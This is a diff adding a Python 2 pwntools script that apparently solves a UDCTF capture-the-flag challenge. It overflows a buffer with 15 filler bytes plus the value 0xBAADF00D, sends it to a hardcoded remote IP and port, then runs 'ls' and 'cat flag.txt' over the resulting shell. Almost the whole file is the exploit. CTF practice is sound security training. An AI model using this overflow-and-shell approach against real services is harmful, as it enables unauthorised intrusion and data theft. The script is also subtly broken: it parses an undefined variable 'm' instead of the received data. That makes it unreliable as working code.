@@ -1,0 +1,40 @@
+# coding: utf-8
+from pwn import *
+from Crypto.Util.number import *
+import re
+
+def red(prt):
+    return "\033[91m{}\033[00m".format(prt)
+def grn(prt):
+    return "\033[92m{}\033[00m".format(prt)
+def cyn(prt):
+    return "\033[96m{}\033[00m".format(prt)
+def flag(stuff):
+    inner = re.search(r"\{.+\}", stuff).group()
+    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))
+
+def save(obj, filename):
+    with open(filename, 'wb') as f:
+        f.write(obj)
+
+# from binary we see that 0xBAADFOOD is checked after 15 bytes to spit out flag
+payload = 'A'*15+'\x0D\xF0\xAD\xBA'
+
+r = remote('52.15.140.126', 5001)
+print r.recv()
+r.send_raw(payload)
+print 'sending paylaod :', payload.encode('hex')
+
+r.sendline('ls')
+print r.recv()
+
+r.sendline('cat flag.txt')
+temp = r.recv()
+r.close()
+
+temp = 'UDCTF{' + m.split('UDCTF{')[1].split('}')[0] + '}'
+print 'FLAG:', flag(temp)
+save(flag(temp), 'flag.txt')
+
+
+    
